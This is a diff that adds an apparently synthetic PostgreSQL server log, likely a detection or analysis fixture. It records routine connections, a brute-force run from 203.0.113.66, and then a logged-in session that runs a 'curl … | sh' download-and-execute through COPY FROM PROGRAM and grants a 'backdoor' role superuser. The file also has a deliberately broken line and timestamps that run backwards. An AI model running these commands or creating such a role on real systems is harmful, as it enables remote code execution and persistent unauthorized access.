@@ -1,0 +1,300 @@
+2026-10-15 08:00:00.420 UTC [812] LOG:  starting PostgreSQL 16.4 on x86_64-pc-linux-gnu
+2026-10-15 08:00:00.435 UTC [812] LOG:  database system is ready to accept connections
+2026-10-15 08:00:31.630 UTC [4101] LOG:  connection received: host=10.0.0.29 port=43362
+2026-10-15 08:00:31.224 UTC [4101] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:00:31.792 UTC [4101] LOG:  disconnection: session time: 0:00:08.667 user=app database=shop host=10.0.0.29 port=56290
+2026-10-15 08:01:02.576 UTC [4102] LOG:  connection received: host=10.0.0.26 port=53074
+2026-10-15 08:01:02.023 UTC [4102] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:01:02.751 UTC [4102] LOG:  disconnection: session time: 0:00:03.593 user=app database=shop host=10.0.0.26 port=63776
+2026-10-15 08:01:33.560 UTC [4103] LOG:  connection received: host=10.0.0.36 port=53677
+2026-10-15 08:01:33.011 UTC [4103] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:01:33.746 UTC [4103] LOG:  disconnection: session time: 0:00:09.344 user=app database=shop host=10.0.0.36 port=59355
+2026-10-15 08:02:04.685 UTC [4104] LOG:  connection received: host=10.0.0.25 port=49122
+2026-10-15 08:02:04.365 UTC [4104] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:02:04.342 UTC [4104] LOG:  disconnection: session time: 0:00:07.826 user=reporting database=shop host=10.0.0.25 port=56204
+2026-10-15 08:02:35.044 UTC [4105] LOG:  connection received: host=10.0.0.20 port=52626
+2026-10-15 08:02:35.270 UTC [4105] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:02:35.131 UTC [4105] LOG:  disconnection: session time: 0:00:07.121 user=reporting database=shop host=10.0.0.20 port=54629
+2026-10-15 08:03:06.287 UTC [4106] LOG:  connection received: host=10.0.0.22 port=52869
+2026-10-15 08:03:06.655 UTC [4106] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:03:06.266 UTC [4106] LOG:  disconnection: session time: 0:00:03.907 user=app database=shop host=10.0.0.22 port=62492
+2026-10-15 08:03:37.323 UTC [4107] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:03:37.885 UTC [4107] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:04:08.263 UTC [4108] LOG:  connection received: host=10.0.0.39 port=54339
+2026-10-15 08:04:08.285 UTC [4108] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:04:08.665 UTC [4108] LOG:  disconnection: session time: 0:00:09.452 user=app database=shop host=10.0.0.39 port=57587
+2026-10-15 08:04:39.131 UTC [4109] LOG:  connection received: host=10.0.0.24 port=45086
+2026-10-15 08:04:39.480 UTC [4109] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:04:39.324 UTC [4109] LOG:  disconnection: session time: 0:00:06.596 user=app database=shop host=10.0.0.24 port=50610
+2026-10-15 08:05:10.624 UTC [813] LOG:  checkpoint starting: time
+2026-10-15 08:05:10.875 UTC [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled
+2026-10-15 08:05:41.741 UTC [4111] LOG:  connection received: host=10.0.0.37 port=58808
+2026-10-15 08:05:41.333 UTC [4111] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:05:41.181 UTC [4111] LOG:  disconnection: session time: 0:00:06.579 user=reporting database=shop host=10.0.0.37 port=64348
+2026-10-15 08:06:12.695 UTC [4112] LOG:  connection received: host=10.0.0.29 port=42612
+2026-10-15 08:06:12.694 UTC [4112] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:06:12.656 UTC [4112] LOG:  disconnection: session time: 0:00:07.849 user=reporting database=shop host=10.0.0.29 port=60494
+2026-10-15 08:06:43.306 UTC [4113] LOG:  connection received: host=10.0.0.38 port=44526
+2026-10-15 08:06:43.537 UTC [4113] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:06:43.272 UTC [4113] LOG:  disconnection: session time: 0:00:09.426 user=reporting database=shop host=10.0.0.38 port=59956
+2026-10-15 08:07:14.674 UTC [4114] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:07:14.720 UTC [4114] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:07:45.668 UTC [4115] LOG:  connection received: host=10.0.0.26 port=63479
+2026-10-15 08:07:45.482 UTC [4115] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:07:45.646 UTC [4115] LOG:  disconnection: session time: 0:00:04.492 user=app database=shop host=10.0.0.26 port=56557
+2026-10-15 08:08:16.738 UTC [4116] LOG:  connection received: host=10.0.0.21 port=40021
+2026-10-15 08:08:16.662 UTC [4116] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:08:16.104 UTC [4116] LOG:  disconnection: session time: 0:00:04.228 user=reporting database=shop host=10.0.0.21 port=50865
+2026-10-15 08:08:47.342 UTC [4117] LOG:  connection received: host=10.0.0.38 port=43610
+2026-10-15 08:08:47.856 UTC [4117] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:08:47.719 UTC [4117] LOG:  disconnection: session time: 0:00:01.279 user=app database=shop host=10.0.0.38 port=54136
+2026-10-15 08:09:18.956 UTC [4118] LOG:  connection received: host=10.0.0.25 port=47180
+2026-10-15 08:09:18.393 UTC [4118] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:09:18.392 UTC [4118] LOG:  disconnection: session time: 0:00:02.909 user=app database=shop host=10.0.0.25 port=62839
+2026-10-15 08:09:49.660 UTC [4119] LOG:  connection received: host=10.0.0.22 port=41340
+2026-10-15 08:09:49.337 UTC [4119] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:09:49.047 UTC [4119] LOG:  disconnection: session time: 0:00:04.847 user=reporting database=shop host=10.0.0.22 port=57453
+2026-10-15 08:10:20.341 UTC [813] LOG:  checkpoint starting: time
+2026-10-15 08:10:20.446 UTC [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled
+2026-10-15 08:10:51.014 UTC [4121] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:10:51.854 UTC [4121] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:11:22.588 UTC [4122] LOG:  connection received: host=10.0.0.36 port=52054
+2026-10-15 08:11:22.525 UTC [4122] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:11:22.281 UTC [4122] LOG:  disconnection: session time: 0:00:03.941 user=reporting database=shop host=10.0.0.36 port=55200
+2026-10-15 08:11:53.752 UTC [4123] LOG:  connection received: host=10.0.0.38 port=60164
+2026-10-15 08:11:53.491 UTC [4123] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:11:53.098 UTC [4123] LOG:  disconnection: session time: 0:00:01.323 user=reporting database=shop host=10.0.0.38 port=49802
+2026-10-15 08:12:24.797 UTC [4124] LOG:  connection received: host=10.0.0.39 port=63229
+2026-10-15 08:12:24.010 UTC [4124] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:12:24.225 UTC [4124] LOG:  disconnection: session time: 0:00:05.125 user=reporting database=shop host=10.0.0.39 port=40902
+2026-10-15 08:12:55.444 UTC [4125] LOG:  connection received: host=10.0.0.34 port=41169
+2026-10-15 08:12:55.831 UTC [4125] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:12:55.190 UTC [4125] LOG:  disconnection: session time: 0:00:04.130 user=app database=shop host=10.0.0.34 port=40072
+2026-10-15 08:13:26.315 UTC [4126] LOG:  connection received: host=10.0.0.31 port=50818
+2026-10-15 08:13:26.681 UTC [4126] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:13:26.982 UTC [4126] LOG:  disconnection: session time: 0:00:09.354 user=app database=shop host=10.0.0.31 port=50002
+2026-10-15 08:13:57.662 UTC [4127] LOG:  connection received: host=10.0.0.25 port=51719
+2026-10-15 08:13:57.335 UTC [4127] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:13:57.649 UTC [4127] LOG:  disconnection: session time: 0:00:07.674 user=reporting database=shop host=10.0.0.25 port=44542
+2026-10-15 08:14:28.129 UTC [4128] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:14:28.968 UTC [4128] STATEMENT:  SELECT * FROM usr WHERE id = 1
+this line was cut by log rotation and is broken on purpose
+2026-10-15 08:14:59.485 UTC [4129] LOG:  connection received: host=10.0.0.35 port=51597
+2026-10-15 08:14:59.712 UTC [4129] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:14:59.999 UTC [4129] LOG:  disconnection: session time: 0:00:07.558 user=app database=shop host=10.0.0.35 port=50550
+2026-10-15 08:15:30.966 UTC [4130] LOG:  connection received: host=203.0.113.66 port=59120
+2026-10-15 08:15:30.808 UTC [4130] FATAL:  role "root" does not exist
+2026-10-15 08:16:01.660 UTC [4131] LOG:  connection received: host=203.0.113.66 port=49872
+2026-10-15 08:16:01.821 UTC [4131] FATAL:  password authentication failed for user "postgres"
+2026-10-15 08:16:01.319 UTC [4131] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:16:32.872 UTC [4132] LOG:  connection received: host=203.0.113.66 port=51909
+2026-10-15 08:16:32.090 UTC [4132] FATAL:  password authentication failed for user "postgres"
+2026-10-15 08:16:32.007 UTC [4132] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:17:03.047 UTC [4133] LOG:  connection received: host=203.0.113.66 port=54833
+2026-10-15 08:17:03.459 UTC [4133] FATAL:  role "root" does not exist
+2026-10-15 08:17:34.756 UTC [4134] LOG:  connection received: host=203.0.113.66 port=49869
+2026-10-15 08:17:34.835 UTC [4134] FATAL:  role "oracle" does not exist
+2026-10-15 08:18:05.090 UTC [4135] LOG:  connection received: host=203.0.113.66 port=43214
+2026-10-15 08:18:05.428 UTC [4135] FATAL:  role "user" does not exist
+2026-10-15 08:18:36.840 UTC [4136] LOG:  connection received: host=203.0.113.66 port=59136
+2026-10-15 08:18:36.351 UTC [4136] FATAL:  password authentication failed for user "postgres"
+2026-10-15 08:18:36.389 UTC [4136] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:19:07.145 UTC [4137] LOG:  connection received: host=203.0.113.66 port=60061
+2026-10-15 08:19:07.243 UTC [4137] FATAL:  role "root" does not exist
+2026-10-15 08:19:38.292 UTC [4138] LOG:  connection received: host=203.0.113.66 port=49119
+2026-10-15 08:19:38.032 UTC [4138] FATAL:  password authentication failed for user "postgres"
+2026-10-15 08:19:38.235 UTC [4138] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:20:09.518 UTC [4139] LOG:  connection received: host=203.0.113.66 port=63667
+2026-10-15 08:20:09.525 UTC [4139] FATAL:  role "test" does not exist
+2026-10-15 08:20:40.257 UTC [4140] LOG:  connection received: host=203.0.113.66 port=49617
+2026-10-15 08:20:40.945 UTC [4140] FATAL:  role "user" does not exist
+2026-10-15 08:21:11.197 UTC [4141] LOG:  connection received: host=203.0.113.66 port=44569
+2026-10-15 08:21:11.631 UTC [4141] FATAL:  role "test" does not exist
+2026-10-15 08:21:42.122 UTC [4142] LOG:  connection received: host=203.0.113.66 port=42902
+2026-10-15 08:21:42.620 UTC [4142] FATAL:  password authentication failed for user "admin"
+2026-10-15 08:21:42.598 UTC [4142] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:22:13.281 UTC [4143] LOG:  connection received: host=203.0.113.66 port=52369
+2026-10-15 08:22:13.782 UTC [4143] FATAL:  password authentication failed for user "postgres"
+2026-10-15 08:22:13.259 UTC [4143] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:22:44.655 UTC [4144] LOG:  connection received: host=203.0.113.66 port=42569
+2026-10-15 08:22:44.119 UTC [4144] FATAL:  password authentication failed for user "admin"
+2026-10-15 08:22:44.575 UTC [4144] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:23:15.429 UTC [4145] LOG:  connection received: host=203.0.113.66 port=52932
+2026-10-15 08:23:15.993 UTC [4145] FATAL:  password authentication failed for user "postgres"
+2026-10-15 08:23:15.942 UTC [4145] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:23:46.226 UTC [4146] LOG:  connection received: host=203.0.113.66 port=49965
+2026-10-15 08:23:46.063 UTC [4146] FATAL:  role "oracle" does not exist
+2026-10-15 08:24:17.834 UTC [4147] LOG:  connection received: host=203.0.113.66 port=47126
+2026-10-15 08:24:17.069 UTC [4147] FATAL:  password authentication failed for user "admin"
+2026-10-15 08:24:17.910 UTC [4147] DETAIL:  Connection matched file "/etc/postgresql/16/main/pg_hba.conf" line 99: "host all all 0.0.0.0/0 scram-sha-256"
+2026-10-15 08:24:48.682 UTC [4148] LOG:  connection received: host=203.0.113.66 port=49964
+2026-10-15 08:24:48.857 UTC [4148] FATAL:  role "guest" does not exist
+2026-10-15 08:25:19.222 UTC [4149] LOG:  connection received: host=203.0.113.66 port=48019
+2026-10-15 08:25:19.183 UTC [4149] FATAL:  role "oracle" does not exist
+2026-10-15 08:25:50.910 UTC [813] LOG:  checkpoint starting: time
+2026-10-15 08:25:50.909 UTC [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled
+2026-10-15 08:26:21.268 UTC [4151] LOG:  connection received: host=10.0.0.23 port=61453
+2026-10-15 08:26:21.500 UTC [4151] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:26:21.270 UTC [4151] LOG:  disconnection: session time: 0:00:09.834 user=app database=shop host=10.0.0.23 port=48630
+2026-10-15 08:26:52.377 UTC [4152] LOG:  connection received: host=10.0.0.30 port=63474
+2026-10-15 08:26:52.364 UTC [4152] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:26:52.013 UTC [4152] LOG:  disconnection: session time: 0:00:05.228 user=reporting database=shop host=10.0.0.30 port=49002
+2026-10-15 08:27:23.634 UTC [4153] LOG:  connection received: host=10.0.0.38 port=59797
+2026-10-15 08:27:23.179 UTC [4153] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:27:23.872 UTC [4153] LOG:  disconnection: session time: 0:00:02.733 user=reporting database=shop host=10.0.0.38 port=48645
+2026-10-15 08:27:54.616 UTC [4154] LOG:  connection received: host=10.0.0.28 port=62358
+2026-10-15 08:27:54.394 UTC [4154] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:27:54.803 UTC [4154] LOG:  disconnection: session time: 0:00:06.358 user=app database=shop host=10.0.0.28 port=63816
+2026-10-15 08:28:25.057 UTC [4155] LOG:  connection received: host=10.0.0.20 port=47150
+2026-10-15 08:28:25.340 UTC [4155] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:28:25.171 UTC [4155] LOG:  disconnection: session time: 0:00:02.530 user=app database=shop host=10.0.0.20 port=54228
+2026-10-15 08:28:56.407 UTC [4156] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:28:56.893 UTC [4156] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:29:27.587 UTC [4157] LOG:  connection received: host=10.0.0.24 port=47327
+2026-10-15 08:29:27.665 UTC [4157] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:29:27.405 UTC [4157] LOG:  disconnection: session time: 0:00:06.343 user=reporting database=shop host=10.0.0.24 port=40776
+2026-10-15 08:29:58.675 UTC [4158] LOG:  connection received: host=10.0.0.36 port=48735
+2026-10-15 08:29:58.272 UTC [4158] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:29:58.288 UTC [4158] LOG:  disconnection: session time: 0:00:08.412 user=reporting database=shop host=10.0.0.36 port=62888
+2026-10-15 08:30:29.147 UTC [4159] LOG:  connection received: host=10.0.0.25 port=57974
+2026-10-15 08:30:29.091 UTC [4159] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:30:29.823 UTC [4159] LOG:  disconnection: session time: 0:00:07.553 user=app database=shop host=10.0.0.25 port=55126
+2026-10-15 08:31:00.109 UTC [4160] LOG:  connection received: host=45.155.205.12 port=40110
+2026-10-15 08:31:00.466 UTC [4160] FATAL:  no pg_hba.conf entry for host "45.155.205.12", user "postgres", database "postgres", no encryption
+2026-10-15 08:31:31.559 UTC [4161] LOG:  connection received: host=10.0.0.28 port=46882
+2026-10-15 08:31:31.458 UTC [4161] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:31:31.930 UTC [4161] LOG:  disconnection: session time: 0:00:01.255 user=app database=shop host=10.0.0.28 port=47515
+2026-10-15 08:32:02.684 UTC [4162] LOG:  connection received: host=10.0.0.20 port=58600
+2026-10-15 08:32:02.906 UTC [4162] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:32:02.804 UTC [4162] LOG:  disconnection: session time: 0:00:08.587 user=app database=shop host=10.0.0.20 port=60034
+2026-10-15 08:32:33.164 UTC [4163] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:32:33.714 UTC [4163] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:33:04.035 UTC [4164] LOG:  connection received: host=10.0.0.24 port=61867
+2026-10-15 08:33:04.284 UTC [4164] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:33:04.117 UTC [4164] LOG:  disconnection: session time: 0:00:02.882 user=app database=shop host=10.0.0.24 port=64923
+2026-10-15 08:33:35.379 UTC [4165] LOG:  connection received: host=10.0.0.25 port=48235
+2026-10-15 08:33:35.441 UTC [4165] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:33:35.632 UTC [4165] LOG:  disconnection: session time: 0:00:09.248 user=reporting database=shop host=10.0.0.25 port=63859
+2026-10-15 08:34:06.115 UTC [4166] LOG:  connection received: host=10.0.0.24 port=52421
+2026-10-15 08:34:06.816 UTC [4166] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:34:06.435 UTC [4166] LOG:  disconnection: session time: 0:00:09.869 user=reporting database=shop host=10.0.0.24 port=54681
+2026-10-15 08:34:37.733 UTC [4167] LOG:  connection received: host=10.0.0.20 port=48520
+2026-10-15 08:34:37.263 UTC [4167] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:34:37.593 UTC [4167] LOG:  disconnection: session time: 0:00:09.963 user=app database=shop host=10.0.0.20 port=55799
+2026-10-15 08:35:08.695 UTC [4168] LOG:  connection received: host=10.0.0.24 port=47010
+2026-10-15 08:35:08.963 UTC [4168] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:35:08.764 UTC [4168] LOG:  disconnection: session time: 0:00:09.246 user=app database=shop host=10.0.0.24 port=64350
+2026-10-15 08:35:39.330 UTC [4169] LOG:  connection received: host=10.0.0.32 port=62703
+2026-10-15 08:35:39.938 UTC [4169] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:35:39.105 UTC [4169] LOG:  disconnection: session time: 0:00:04.682 user=app database=shop host=10.0.0.32 port=61688
+2026-10-15 08:36:10.671 UTC [813] LOG:  checkpoint starting: time
+2026-10-15 08:36:10.741 UTC [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled
+2026-10-15 08:36:41.719 UTC [4171] LOG:  connection received: host=10.0.0.33 port=50588
+2026-10-15 08:36:41.708 UTC [4171] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:36:41.560 UTC [4171] LOG:  disconnection: session time: 0:00:05.713 user=app database=shop host=10.0.0.33 port=64556
+2026-10-15 08:37:12.428 UTC [4172] LOG:  connection received: host=10.0.0.21 port=58036
+2026-10-15 08:37:12.296 UTC [4172] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:37:12.375 UTC [4172] LOG:  disconnection: session time: 0:00:08.932 user=app database=shop host=10.0.0.21 port=52735
+2026-10-15 08:37:43.137 UTC [4173] LOG:  connection received: host=10.0.0.38 port=53417
+2026-10-15 08:37:43.256 UTC [4173] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:37:43.782 UTC [4173] LOG:  disconnection: session time: 0:00:04.714 user=app database=shop host=10.0.0.38 port=58779
+2026-10-15 08:38:14.296 UTC [4174] LOG:  connection received: host=10.0.0.33 port=44029
+2026-10-15 08:38:14.762 UTC [4174] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:38:14.726 UTC [4174] LOG:  disconnection: session time: 0:00:02.163 user=reporting database=shop host=10.0.0.33 port=62524
+2026-10-15 08:38:45.336 UTC [4175] LOG:  connection received: host=203.0.113.66 port=56723
+2026-10-15 08:38:45.931 UTC [4175] LOG:  connection authorized: user=postgres database=postgres application_name=psql
+2026-10-15 08:38:45.980 UTC [4175] LOG:  statement: COPY cmd_out FROM PROGRAM 'curl -s http://evil.example/x.sh | sh'
+2026-10-15 08:38:45.662 UTC [4175] LOG:  statement: ALTER ROLE backdoor WITH SUPERUSER LOGIN
+2026-10-15 08:39:16.458 UTC [4176] LOG:  connection received: host=10.0.0.29 port=57327
+2026-10-15 08:39:16.030 UTC [4176] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:39:16.165 UTC [4176] LOG:  disconnection: session time: 0:00:09.232 user=reporting database=shop host=10.0.0.29 port=41155
+2026-10-15 08:39:47.535 UTC [4177] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:39:47.899 UTC [4177] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:40:18.644 UTC [4178] LOG:  connection received: host=10.0.0.24 port=40330
+2026-10-15 08:40:18.832 UTC [4178] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:40:18.570 UTC [4178] LOG:  disconnection: session time: 0:00:01.390 user=reporting database=shop host=10.0.0.24 port=56867
+2026-10-15 08:40:49.896 UTC [4179] LOG:  connection received: host=10.0.0.33 port=41649
+2026-10-15 08:40:49.840 UTC [4179] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:40:49.840 UTC [4179] LOG:  disconnection: session time: 0:00:02.361 user=app database=shop host=10.0.0.33 port=58108
+2026-10-15 08:41:20.295 UTC [813] LOG:  checkpoint starting: time
+2026-10-15 08:41:20.885 UTC [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled
+2026-10-15 08:41:51.383 UTC [4181] LOG:  connection received: host=10.0.0.31 port=62768
+2026-10-15 08:41:51.137 UTC [4181] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:41:51.045 UTC [4181] LOG:  disconnection: session time: 0:00:08.132 user=app database=shop host=10.0.0.31 port=40914
+2026-10-15 08:42:22.654 UTC [4182] LOG:  connection received: host=10.0.0.22 port=47226
+2026-10-15 08:42:22.759 UTC [4182] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:42:22.516 UTC [4182] LOG:  disconnection: session time: 0:00:07.112 user=reporting database=shop host=10.0.0.22 port=49590
+2026-10-15 08:42:53.533 UTC [4183] LOG:  connection received: host=10.0.0.37 port=59328
+2026-10-15 08:42:53.924 UTC [4183] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:42:53.317 UTC [4183] LOG:  disconnection: session time: 0:00:08.970 user=reporting database=shop host=10.0.0.37 port=46770
+2026-10-15 08:43:24.137 UTC [4184] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:43:24.380 UTC [4184] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:43:55.409 UTC [4185] LOG:  connection received: host=10.0.0.29 port=58626
+2026-10-15 08:43:55.761 UTC [4185] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:43:55.720 UTC [4185] LOG:  disconnection: session time: 0:00:01.457 user=app database=shop host=10.0.0.29 port=57057
+2026-10-15 08:44:26.902 UTC [4186] LOG:  connection received: host=10.0.0.30 port=46481
+2026-10-15 08:44:26.925 UTC [4186] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:44:26.961 UTC [4186] LOG:  disconnection: session time: 0:00:03.186 user=app database=shop host=10.0.0.30 port=48464
+2026-10-15 08:44:57.712 UTC [4187] LOG:  connection received: host=10.0.0.33 port=59866
+2026-10-15 08:44:57.399 UTC [4187] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:44:57.854 UTC [4187] LOG:  disconnection: session time: 0:00:05.698 user=app database=shop host=10.0.0.33 port=41021
+2026-10-15 08:45:28.547 UTC [4188] LOG:  connection received: host=10.0.0.32 port=59499
+2026-10-15 08:45:28.337 UTC [4188] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:45:28.298 UTC [4188] LOG:  disconnection: session time: 0:00:03.839 user=app database=shop host=10.0.0.32 port=51385
+2026-10-15 08:45:59.404 UTC [4189] LOG:  connection received: host=10.0.0.23 port=63347
+2026-10-15 08:45:59.224 UTC [4189] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:45:59.011 UTC [4189] LOG:  disconnection: session time: 0:00:08.211 user=app database=shop host=10.0.0.23 port=53701
+2026-10-15 08:46:30.115 UTC [4190] FATAL:  sorry, too many clients already
+2026-10-15 08:47:01.760 UTC [4191] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:47:01.358 UTC [4191] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:47:32.327 UTC [4192] LOG:  connection received: host=10.0.0.37 port=50684
+2026-10-15 08:47:32.101 UTC [4192] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:47:32.218 UTC [4192] LOG:  disconnection: session time: 0:00:08.264 user=app database=shop host=10.0.0.37 port=40572
+2026-10-15 08:48:03.157 UTC [4193] LOG:  connection received: host=10.0.0.38 port=63400
+2026-10-15 08:48:03.416 UTC [4193] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:48:03.220 UTC [4193] LOG:  disconnection: session time: 0:00:07.702 user=app database=shop host=10.0.0.38 port=48254
+2026-10-15 08:48:34.131 UTC [4194] LOG:  connection received: host=10.0.0.36 port=60639
+2026-10-15 08:48:34.048 UTC [4194] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:48:34.087 UTC [4194] LOG:  disconnection: session time: 0:00:07.537 user=reporting database=shop host=10.0.0.36 port=64121
+2026-10-15 08:49:05.806 UTC [4195] LOG:  connection received: host=10.0.0.36 port=44724
+2026-10-15 08:49:05.964 UTC [4195] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:49:05.135 UTC [4195] LOG:  disconnection: session time: 0:00:08.527 user=app database=shop host=10.0.0.36 port=56022
+2026-10-15 08:49:36.222 UTC [4196] LOG:  connection received: host=10.0.0.37 port=46627
+2026-10-15 08:49:36.990 UTC [4196] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:49:36.623 UTC [4196] LOG:  disconnection: session time: 0:00:01.112 user=app database=shop host=10.0.0.37 port=40120
+2026-10-15 08:50:07.942 UTC [4197] LOG:  connection received: host=10.0.0.32 port=54055
+2026-10-15 08:50:07.788 UTC [4197] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:50:07.374 UTC [4197] LOG:  disconnection: session time: 0:00:07.239 user=app database=shop host=10.0.0.32 port=57117
+2026-10-15 08:50:38.882 UTC [4198] ERROR:  relation "usr" does not exist at character 15
+2026-10-15 08:50:38.280 UTC [4198] STATEMENT:  SELECT * FROM usr WHERE id = 1
+2026-10-15 08:51:09.221 UTC [4199] LOG:  connection received: host=10.0.0.21 port=53710
+2026-10-15 08:51:09.442 UTC [4199] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:51:09.300 UTC [4199] LOG:  disconnection: session time: 0:00:05.813 user=app database=shop host=10.0.0.21 port=58917
+2026-10-15 08:51:40.371 UTC [813] LOG:  checkpoint starting: time
+2026-10-15 08:51:40.278 UTC [813] LOG:  checkpoint complete: wrote 42 buffers (0.3%); 0 WAL file(s) added, 0 removed, 0 recycled
+2026-10-15 08:52:11.073 UTC [4201] LOG:  connection received: host=10.0.0.28 port=62816
+2026-10-15 08:52:11.215 UTC [4201] LOG:  connection authorized: user=reporting database=shop application_name=api
+2026-10-15 08:52:11.805 UTC [4201] LOG:  disconnection: session time: 0:00:08.202 user=reporting database=shop host=10.0.0.28 port=40943
+2026-10-15 08:52:42.965 UTC [4202] LOG:  connection received: host=10.0.0.37 port=57970
+2026-10-15 08:52:42.619 UTC [4202] LOG:  connection authorized: user=app database=shop application_name=api
+2026-10-15 08:52:42.369 UTC [4202] LOG:  disconnection: session time: 0:00:09.657 user=app database=shop host=10.0.0.37 port=46810
+2026-10-15 08:53:13.416 UTC [4203] LOG:  connection received: host=10.0.0.31 port=54405
+2026-10-15 08:53:13.311 UTC [4203] LOG:  connection authorized: user=app database=shop application_name=api
